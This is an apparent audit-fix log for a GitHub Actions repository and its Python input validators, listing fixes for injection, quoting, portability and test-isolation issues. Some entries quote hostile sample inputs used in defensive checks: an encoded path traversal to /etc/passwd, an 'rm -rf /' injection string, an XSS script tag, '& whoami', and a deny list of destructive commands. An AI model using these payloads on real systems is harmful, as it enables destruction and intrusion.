#### [N-064] Registry singleton test isolation via `reset()` and `autouse` fixture

Fixed: 2026-05-03
Notes: Added `reset()` method to `ValidatorRegistry` (clears `_validators` and
`_validator_instances`). Created `validate-inputs/tests/conftest.py` with an
`autouse=True` fixture that calls `registry._registry.reset()` after each test.

#### [N-065] `validate_no_injection` clears errors at start of each call

Fixed: 2026-05-03
Notes: Added `self.clear_errors()` as the first line of `validate_no_injection` in
`validate-inputs/validators/security.py`. Stale errors from previous calls on the
same instance no longer accumulate.

#### [N-066] `validate_path_security` URL-decodes before traversal check

Fixed: 2026-05-03
Notes: Added `urllib.parse.unquote(path)` before the `..` check in `base.py`.
`%2E%2E/etc/passwd` now triggers the traversal error. `import urllib.parse` added to
imports.

#### [N-067] `registry._load_custom_validator` catches `NameError`/`RuntimeError`/`ValueError`

Fixed: 2026-05-03
Notes: Added `NameError, RuntimeError, ValueError` to the except tuple around
`exec_module` in `validate-inputs/validators/registry.py`.

#### [N-068] `ansible-lint-fix` mutually exclusive flags resolved

Fixed: 2026-05-03
Notes: Removed `--parseable-severity` from the ansible-lint invocation in
`ansible-lint-fix/action.yml`; `--format sarif` is now the sole output format flag.

#### [N-069] `terraform-lint-fix` and `python-lint-fix` cleanup guarded against empty `$TEMP_DIR`

Fixed: 2026-05-03
Notes: Changed `rm -rf "$WORKING_DIR/$TEMP_DIR"` to `[ -n "$\{TEMP_DIR:-}" ] && rm -rf ...`
in both action files, preventing accidental deletion of the working directory.

#### [N-070] `docker-publish` accepts `./Dockerfile` path

Fixed: 2026-05-03
Notes: Extended dockerfile case pattern in `docker-publish/action.yml` to include
`./`-prefixed paths alongside bare filenames.

#### [N-071] `compress-images` filesystem check moved to after checkout

Fixed: 2026-05-03
Notes: Moved the `[ ! -d "$WORKING_DIRECTORY" ]` check to a new post-checkout
`Verify Working Directory` step in `compress-images/action.yml`. Pre-checkout checks
now validate only input values, not filesystem state.

#### [N-072] Release/publish workflows documented for `timeout-minutes`

Fixed: 2026-05-03
Notes: Added `# timeout-minutes is set at the calling workflow level` comments to
main publishing steps in composite actions. Added `timeout-minutes: 30` to all jobs
in calling workflow files `release.yml` and `new-release.yml`.

#### [N-073] `post-edit-write.sh` hook no longer swallows linter exit codes

Fixed: 2026-05-03
Notes: Removed `|| true` from `shellcheck`, `actionlint`, and `action-validator` calls
in `.claude/hooks/post-edit-write.sh`. Auto-formatters (`ruff format`, `shfmt`,
`prettier`) retain `|| true`. Hook now exits nonzero on unfixed linter errors.

#### [N-074] `validate_url` hostname regex no longer allows underscore

Fixed: 2026-05-03
Notes: Changed `[\w.-]+` to `[a-zA-Z0-9.-]+` in the hostname character class in
`validate-inputs/validators/network.py`. RFC 1123 prohibits underscores in hostnames.

#### [N-075] `biome-lint` SARIF upload guarded against missing file

Fixed: 2026-05-03
Notes: Changed `if: always()` to
`if: always() && inputs.mode == 'check' && hashFiles('biome-report.sarif') != ''`
on the SARIF upload step in `biome-lint/action.yml`. Prevents double-failure when
biome crashes and produces no SARIF.

#### [N-076] `validate_safe_command` dead `mkfs` entry removed

Fixed: 2026-05-03
Notes: Removed the redundant explicit `"mkfs"` string from the `dangerous_commands`
list in `validate_safe_command`; the broader `re.search(r"\bmkfs", command)` pattern
already covered it.

#### [N-077] `_validate_key_value_list` now splits on newlines and allows spaces in values

Fixed: 2026-05-03
Notes: Changed the key-value list parser in `validate-inputs/validators/docker.py` to
split on newlines only and validate values with `^[A-Za-z_][A-Za-z0-9_]*=.*$`.
`GREETING=Hello World` now passes; entries with no `=` are still rejected.

#### [N-078] Makefile `SHELL` changed to `/bin/sh`; `pipefail` removed

Fixed: 2026-05-03
Notes: Changed `SHELL := /bin/bash` to `SHELL := /bin/sh` and `.SHELLFLAGS`
from `-euo pipefail -c` to `-eu -c` in `Makefile`. POSIX sh has no `pipefail`.
All `make` targets now run under POSIX sh, consistent with the project mandate.

### Pass 9 — 2026-05-03

#### [N-031] `docker-build` multi-line `args` output truncates all but first `--build-arg`

Fixed: 2026-05-03
Notes: Changed `printf 'args=%s\n' "$args"` to
`{ printf 'args<<EOF\n%s\nEOF\n' "$args"; } >> "$GITHUB_OUTPUT"` in
docker-build/action.yml. All subsequent `--build-arg` lines now survive in the
output via the GITHUB_OUTPUT heredoc format.

#### [N-032] `_read_appended_bytes`: TOCTOU race — `path.stat()` by name inside open fd

Fixed: 2026-05-03
Notes: Replaced `path.stat().st_size` with `os.fstat(handle.fileno()).st_size` in
`_tests/framework/harness/harness.py:_read_appended_bytes`. The fd-based stat is
immune to file rotation between open() and stat(). `import os` was already present.

#### [N-033] Step output filename collision when skipped step brackets two active steps

Fixed: 2026-05-03
Notes: Added monotonic `step_output_index = 0` counter before the steps loop in
`_run_owned`. Counter increments at the top of each iteration before any skip
check. Filename changed from `f".github_output_{len(steps_ctx)}"` to
`f".github_output_{step_output_index}"`.

#### [N-034] `install_shellspec`: outer EXIT trap permanently replaced on failure path

Fixed: 2026-05-03
Notes: Replaced separate cleanup function + conditional restore with a single
`trap 'rm -f "${tarball:-}"; eval "${_old_trap:-:}"' EXIT` set unconditionally at
function entry in `_tests/run-tests.sh:install_shellspec`. Outer trap now restored
on all exit paths including failure.

#### [N-035] `is_github_expression` partial-embed bypass

Fixed: 2026-05-03
Notes: Removed the unsafe second OR branch `("${{" in value and "}}" in value)`.
New implementation: `return value.startswith("${{")`. Pure expressions
(`${{ github.token }}`), expression-prefixed values (`${{ github.workspace }}/path`),
and inline expressions all pass. Payloads like `"; rm -rf / # ${{ secrets.X }}"`
are rejected — they don't start with `${{`. 761 tests pass.

#### [N-036] `validate_tag` regex accepts trailing dot/colon

Fixed: 2026-05-03
Notes: Made the final character group non-optional in
`validate-inputs/validators/docker.py:validate_tag`. `v1.` and `latest:` now
rejected; `latest`, `v1.2.3`, `sha256:abc` still accepted.

#### [N-037] `file_path` validator space enables argument injection

Fixed: 2026-05-03
Notes: Removed the literal space from the file_path character class in
`validate-inputs/validators/file.py`. Paths containing spaces are now rejected.
ruff passes clean.

#### [N-038] `eslint-lint` `--ext $FILE_EXTENSIONS` unquoted in fix mode

Fixed: 2026-05-03
Notes: Quoted `$FILE_EXTENSIONS` in all 4 fix-mode eslint invocations in
`eslint-lint/action.yml`. Consistent with the check-mode step.

#### [N-039] `prettier-lint` unformatted file count inflated by summary line

Fixed: 2026-05-03
Notes: Changed `grep -c "^"` to `grep -c "^\[warn\]" ... || true` in
`prettier-lint/action.yml`. Now counts only Prettier `[warn]` lines (one per
unformatted file), excluding header and summary lines.

#### [N-040] `go-lint` `error_count` not updated when `FAIL_ON_ERROR=false`

Fixed: 2026-05-03
Notes: Restructured `go-lint/action.yml` to capture `error_count` unconditionally
before the `FAIL_ON_ERROR` branch. GITHUB_OUTPUT write happens on all paths before
any `exit` call.

#### [N-041] `registry.py` `exec_module` raises uncaught `SyntaxError`/`OSError`

Fixed: 2026-05-03
Notes: Added `SyntaxError, OSError` to the except tuple around `exec_module` in
`validate-inputs/validators/registry.py`. Malformed validator files no longer
abort the entire validation run.

#### [N-042] `convention_mapper.py` priority-95 "contains" overcaptures version inputs

Fixed: 2026-05-03
Notes: Changed `"type": "contains"` to `"type": "exact"` for the priority-95
version-pattern group in `validate-inputs/validators/convention_mapper.py`.
`"non-python-version"` no longer matches the `python_version` validator.

#### [N-043] `conventions.py` stale errors leak from one input to the next

Fixed: 2026-05-03
Notes: Added `validator_module.errors = []` reset before each per-input validation
call (and in the exception handler) in `validate-inputs/validators/conventions.py`.

#### [N-044] `network.py` URL path allows `<` and `>`

Fixed: 2026-05-03
Notes: Updated URL path regex in `validate-inputs/validators/network.py` to
explicitly exclude `<` and `>`. XSS payloads like
`https://example.com/<script>alert(1)</script>` now fail URL validation.

#### [N-045] `docker-build` BUILD_CONTEXTS/SECRETS/CACHE_FROM/CACHE_TO unquoted word-split

Fixed: 2026-05-03
Notes: Applied temp-file + `while IFS= read -r` loop to BUILD_CONTEXTS, SECRETS,
CACHE_FROM, and CACHE_TO in `docker-build/action.yml`, consistent with the
existing BUILD_ARGS pattern.

#### [N-046] `generate_sarif_report` temp files leaked on `jq` failure

Fixed: 2026-05-03
Notes: Added `trap 'rm -f "$_sarif_results_file" "$_sarif_rules_file"' RETURN`
immediately after mktemp calls in `_tests/run-tests.sh:generate_sarif_report`.
Cleanup guaranteed on all exit paths including jq failure. Script shebang is bash
so RETURN trap is valid.

#### [N-047] `security.py` single-`&` detection flags URL query strings

Fixed: 2026-05-03
Notes: Replaced `"&" in value` in `validate_no_injection` with
`re.search(r"(?<![A-Za-z0-9=])&(?![A-Za-z0-9=])", value)`. Negative lookbehind/
lookahead on alphanumeric and `=` distinguishes shell backgrounding `&` (non-word
boundary on at least one side) from URL query-string `&` (surrounded by word
chars). `"foo=1&bar=2"` passes; `"& whoami"` and `"cmd &"` are rejected.
761 tests pass.

#### [N-048] `php-tests` `composer-args` direct `${{ inputs.* }}` interpolation

Fixed: 2026-05-03
Notes: Added `env: COMPOSER_ARGS: ${{ inputs.composer-args }}` block to the
affected step in `php-tests/action.yml`. Shell body now references `$COMPOSER_ARGS`
instead of `${{ inputs.composer-args }}`.

### Pass 8 — 2026-04-30

#### [N-029] `collect_inputs()` inflates `rules-applied` output count

Fixed: 2026-04-30
Notes: Changed `rules=len(inputs)` to `rules=sum(1 for k in inputs if "_" not in k)` at both
`write_output` call sites in `validator.py:main()`. Canonical (dash-normalised) keys have no
underscores; the underscore-aliased duplicates are excluded from the count. 760 Python tests pass.

#### [N-030] `is_fiximus` input uses snake_case; all other `validate-inputs` inputs use kebab-case

Fixed: 2026-04-30
Notes: Renamed `is_fiximus:` to `is-fiximus:` in the `inputs:` block of `validate-inputs/action.yml`
and updated the env block reference from `${{ inputs.is_fiximus }}` to `${{ inputs.is-fiximus }}`.
`make lint` passes clean (actionlint + action-validator).

### Pass 7 — 2026-04-30

#### [N-023] `fail-on-error: 'false'` is silently ignored — validator always exits 1 on failure

Fixed: 2026-04-30
Notes: Added `fail_on_error = os.environ.get("INPUT_FAIL_ON_ERROR", "true").lower() != "false"`
in `validator.py:main()`. Changed the failure branch to only call `sys.exit(1)` when
`fail_on_error` is True. Soft failures now write the failure output and return exit 0.

#### [N-024] `rules-file` input is silently ignored — custom rules are never loaded

Fixed: 2026-04-30
Notes: In `validator.py:main()`, after `get_validator(action_type)`, reads
`INPUT_RULES_FILE` and calls `validator.load_rules(Path(rules_file))` when non-empty.
`ConventionBasedValidator.load_rules()` already accepted a `rules_path` argument; no
registry API changes needed.

#### [N-025] `write_output` writes unsanitized user-controlled values to GITHUB_OUTPUT

Fixed: 2026-04-30
Notes: Added `_sanitize(value)` helper that replaces `\r` and `\n` with a space. Applied
to all three write sites in `write_output`: `status=`, `action=`, and the kwargs
comprehension. Confirmed: a value containing `\n` now produces a single-line entry in
GITHUB_OUTPUT.

#### [N-026] 2 declared action outputs are never written — callers always get empty strings

Fixed: 2026-04-30
Notes: Added `result="passed"` / `result=f"failed with {n} error(s)"` and
`rules=len(inputs)` to both `write_output` call sites in `validator.py:main()`. The
`steps.validate.outputs.result` and `steps.validate.outputs.rules` outputs are now
populated on every run.

#### [N-027] 6 security-scan inputs declared in `action.yml` but missing from `env:` block

Fixed: 2026-04-30
Notes: Added `INPUT_GITLEAKS_LICENSE`, `INPUT_GITLEAKS_CONFIG`, `INPUT_TRIVY_SEVERITY`,
`INPUT_TRIVY_SCANNERS`, `INPUT_TRIVY_TIMEOUT`, `INPUT_ACTIONLINT_ENABLED` to the env
block of the `Validate Action Inputs` step in `validate-inputs/action.yml`. Confirmed:
`grep -c 'GITLEAKS\|TRIVY\|ACTIONLINT' validate-inputs/action.yml` → 6 hits.

#### [N-028] `pip install pyyaml` without `--user` fails on PEP 668 systems

Fixed: 2026-04-30
Notes: Replaced `pip install pyyaml==6.0.3` with `astral-sh/setup-uv` + `uv sync`. Added
`uses: astral-sh/setup-uv@08807647e7069bb48b6ef5acd8ec9567f424441b # v8.1.0` step,
changed install to `uv sync --directory "${{ github.action_path }}"` (reads pyproject.toml),
and changed execution to `uv run validator.py`. No pip, no system-Python pollution, no
PEP 668 conflict. Consistent with the repo's uv-based local toolchain.

### Pass 1 — 2026-04-30

#### [N-001] Missing explicit `shell:` on 6 composite action `run:` blocks

Fixed: 2026-04-30
Notes: Added `shell: sh` to `docker-build/action.yml:415`,
`eslint-lint/action.yml:115,381`, `go-lint/action.yml:104,340`,
`prettier-lint/action.yml:109`. All 6 blocks confirmed gone (corrected scan returns
0 hits).

#### [N-002] `file_path` validator allows whitespace including newlines

Fixed: 2026-04-30
Notes: Changed regex from `r"^[a-zA-Z0-9._/\-\s]+$"` to
`r"^[a-zA-Z0-9._/\- ]+$"` in `validate-inputs/validators/file.py:91`. Verified:
`re.match(r"^[a-zA-Z0-9._/\- ]+$", "dir\nEVIL=x")` now returns `None` (rejected);
valid path `"legit-dir/subpath"` still accepted.

#### [N-003] GITHUB_ENV writes use `echo "KEY=$VAR"` without newline protection

Fixed: 2026-04-30
Notes: Replaced grouped `echo` blocks with individual `printf 'KEY=%s\n' "$VAR" >>
"$GITHUB_ENV"` in `terraform-lint-fix/action.yml:103-107` and
`release-monthly/action.yml:75-77`. Confirmed no `echo "VALIDATED_` pattern remains
in any action.yml.

#### [N-004] No unit tests for `npm-semantic-release`

Fixed: 2026-04-30
Notes: Created `_tests/unit/npm-semantic-release/validation.spec.sh` with 21 test
cases. A defect in those tests was found in Pass 2 and tracked as N-008.

#### [N-005] `${{ env.VALIDATED_TOKEN }}` pattern allows caller-level env override

Fixed: 2026-04-30
Notes: Changed `token: ${{ env.VALIDATED_TOKEN }}` to `token: ${{ inputs.token }}`
in `release-monthly/action.yml:81`. Changed
`sarif_file: ${{ env.VALIDATED_WORKING_DIR }}/reports/tflint.sarif` to
`sarif_file: ${{ inputs.working-directory }}/reports/tflint.sarif` in
`terraform-lint-fix/action.yml:259`. Confirmed: `rg '\$\{\{ env\.VALIDATED_'`
returns 0 hits in any action.yml.

#### [N-006] No `actionlint` configuration file

Fixed: 2026-04-30
Notes: Created `.github/actionlint.yaml` with shellcheck integration enabled.

#### [N-007] 91 `TODO` occurrences in auto-generated test files are intentional

Fixed: 2026-04-30
Notes: Renamed all 5 TODO template strings to `CUSTOMIZE:` in
`validate-inputs/scripts/generate-tests.py`. Updated the assertion in
`validate-inputs/tests/test_generate_tests.py:275` from `"TODO: Add specific test
cases"` to `"CUSTOMIZE: Add specific test cases"`. No TODO occurrences remain in
generate-tests.py.

### Pass 2 — 2026-04-30

#### [N-008] npm-semantic-release unit tests: 4 fail, 6 pass for wrong reason

Fixed: 2026-04-30
Notes: Added `"npm-semantic-release"` to the `setup_default_inputs` and
`cleanup_default_inputs` case statements in `_tests/unit/spec_helper.sh` (lines 92,
151), defaulting `INPUT_NPM_TOKEN` when testing non-token inputs. Also added `../`
and `..\` to the URL injection pattern check in
`validate-inputs/validators/network.py:131` so the path-traversal test case
correctly exercises the validator. All 24 examples now pass.

#### [N-009] `shell: bash` and `[[` bash-isms in setup-test-environment action

Fixed: 2026-04-30
Notes: Changed all 8 `shell: bash` to `shell: sh` in
`.github/actions/setup-test-environment/action.yml`. Replaced
`[[ "${ACTUAL_CHECKSUM}" != "${EXPECTED_CHECKSUM}" ]]` with `[ ... ]` (line 95)
and `[[ "${{ inputs.install-act }}" == "true" ]]` with `[ ... = ... ]` (line 166).
Changed 2 instances of `set -euo pipefail` to `set -eu`. Added `set -eu` to the 6
blocks that were missing it.

#### [N-010] `set -eu` missing from 4 production run blocks

Fixed: 2026-04-30
Notes: Added `set -eu` as first line of run body in:
`csharp-publish/action.yml:48` (mask step), `csharp-publish/action.yml:247`
(status output, also converted `run: |-` to `run: |`),
`pr-lint/action.yml:718` (error+exit step),
`docker-build/action.yml:165` (Dockerfile existence check).

### Pass 3 — 2026-04-30

#### [N-011] `make test-python` breaks after clean `uv sync`

Fixed: 2026-04-30
Notes: Changed `test-python`, `test-python-coverage`, `test-update-validators`, and
`test-generate-tests` Makefile targets from `uv run pytest` (root venv, pytest not
in base deps) to `uv run --directory validate-inputs pytest` (subproject venv, which
always has pytest via `uv sync --all-extras`). All 4 targets verified: 828 Python
tests pass, 26 update-validator tests pass, 11 generate-tests tests pass.

### Pass 5 — 2026-04-30

#### [N-016] 3 PreToolUse hooks use `echo "$INPUT" | jq` — silent failure on control chars

Fixed: 2026-04-30
Notes: Added `CLEAN_INPUT=$(printf '%s' "$INPUT" | LC_ALL=C tr -d '\000-\010\013\014\016-\037')`
and switched `jq` calls to read from `$CLEAN_INPUT` with `2>/dev/null || true` in
`block-echo-github-output.sh`, `block-readme-edits.sh`, and `block-rules-yml.sh`.
Verified: hook now exits 0 (no jq parse error) when new_string contains 0x01 and
still correctly blocks `echo.*>>.*GITHUB_OUTPUT` and `rules.yml` patterns.

#### [N-017] `block-rules-yml.sh` had no unit test

Fixed: 2026-04-30
Notes: Created `_tests/unit/claude-hooks/block_rules_yml_spec.sh` with 9 test cases
covering: empty path (pass), `*/rules.yml` paths (deny), non-rules.yml paths (pass),
deny JSON format (hookEventName, permissionDecision, reason includes
"update-validators"). `make lint` passes clean.

### Pass 4 — 2026-04-30

#### [N-012] N-007 fix incomplete — 22 committed `_custom.py` files still contained `TODO:`

Fixed: 2026-04-30
Notes: `sed -i '' 's/# TODO:/# CUSTOMIZE:/g' validate-inputs/tests/*_custom.py`
replaced `TODO:` with `CUSTOMIZE:` in all 22 committed custom test files.
Confirmed: `rg -l 'TODO:' validate-inputs/tests/*_custom.py | wc -l` → 0.

#### [N-013] README "Actions by Category" omitted `npm-semantic-release`; count mismatch

Fixed: 2026-04-30
Notes: Added `npm-semantic-release` to the Publishing category table in
`README.md`, updated header from "Publishing (3 actions)" to "Publishing (4
actions)", and changed its Quick Reference category from "Other" to "Publishing".
Category section now totals 26, matching the Quick Reference header.

#### [N-014] `csharp-publish/action.yml:202` used GNU `find -printf` in POSIX sh block

Fixed: 2026-04-30
Notes: Replaced `find ... -printf '%T@ %p\n' | sort -rn | head -1 | cut ...` with
a POSIX sh loop using `-nt` test operator to find the newest `.nupkg` file. No
GNU find extensions remain. `make lint` (actionlint + shellcheck) passes clean.

#### [N-015] Orphaned `_tests/unit/action-versioning/` for deleted action

Fixed: 2026-04-30
Notes: Deleted `_tests/unit/action-versioning/` (24 tests for non-existent action).
The `action-versioning` action was removed in commit `ed3aed3`; the test directory
was left behind. `ls _tests/unit/action-versioning/` now returns "No such file or
directory".

### Pass 6 — 2026-04-30

#### [N-018] 11 phantom `_custom.py` test files silently test wrong `CustomValidator`

Fixed: 2026-04-30
Notes: Deleted all 11 phantom files: `test_common-file-check_custom.py`,
`test_docker-publish-gh_custom.py`, `test_docker-publish-hub_custom.py`,
`test_eslint-check_custom.py`, `test_go-version-detect_custom.py`,
`test_php-version-detect_custom.py`, `test_prettier-check_custom.py`,
`test_prettier-fix_custom.py`, `test_python-version-detect-v2_custom.py`,
`test_python-version-detect_custom.py`, `test_version-validator_custom.py`. Confirmed:
`ls validate-inputs/tests/*_custom.py | while read f; do ... done` → 0 phantom files.

#### [N-019] `spec_helper.sh` carries 9 phantom case entries for deleted actions

Fixed: 2026-04-30
Notes: Removed all 9 dead case branches from both `setup_default_inputs` and
`cleanup_default_inputs` in `_tests/unit/spec_helper.sh`: `github-release`,
`php-composer`, `php-laravel-phpunit` (from `php-tests` compound case),
`dotnet-version-detect`, `python-version-detect`, `python-version-detect-v2`,
`php-version-detect`, `go-version-detect`, `version-validator`. Also trimmed
`docker-publish-gh` and `docker-publish-hub` from the `docker-build | docker-publish`
compound case pattern. Confirmed: `grep -c 'github-release\|...' spec_helper.sh` → 0.

#### [N-020] `shellspec_mock_action_run` function is entirely dead code

Fixed: 2026-04-30
Notes: Deleted the entire `shellspec_mock_action_run` function (~135 lines including
mocks for node-setup, docker-build, common-file-check, csharp-build, csharp-lint-check,
csharp-publish, docker-publish, docker-publish-gh, docker-publish-hub,
dotnet-version-detect, eslint-check, eslint-fix, github-release, go-build, go-lint,
go-version-detect, npm-publish, php-composer). Removed from `export -f` line.
Confirmed: `rg 'shellspec_mock_action_run' _tests/ --glob='*.sh'` → 0 hits.

#### [N-021] Integration workflows reference non-existent `node-setup` and deleted `version-validator`

Fixed: 2026-04-30
Notes: (1) Deleted `_tests/integration/workflows/version-validator-test.yml` (entire
file tests a deleted action; 8 jobs, all broken). (2) Replaced all 3 `uses: ./node-setup`
in `lint-fix-chain-test.yml` with
`actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0` (same SHA
already used in `.github/actions/setup-test-environment/action.yml`); removed stale
`working-directory` input (not accepted by setup-node). (3) Removed `node-setup/**`
from `paths:` trigger in both `lint-fix-chain-test.yml` and `npm-publish-test.yml`.
Confirmed: `grep -rl 'node-setup\|version-validator' _tests/integration/workflows/`
→ 0 files.

#### [N-022] All integration test workflows used `actions/checkout@v4` without SHA pin

Fixed: 2026-04-30
Notes: Replaced all `actions/checkout@v4` instances in the 4 remaining integration
workflow files (`lint-fix-chain-test.yml`, `docker-build-publish-test.yml`,
`npm-publish-test.yml`, `pre-commit-test.yml`) with
`actions/checkout@71cf2267d89c5cb81562390fa70a37fa40b1305e # v6-beta` — the same SHA
used throughout `.github/workflows/`. 21 instances pinned (down from 29: 8 were in
the deleted `version-validator-test.yml`). Confirmed: `grep -rl 'checkout@v4'
_tests/integration/workflows/` → 0 files.

## Invalid

### Pass 1 — 2026-04-30

No findings invalidated in this pass.
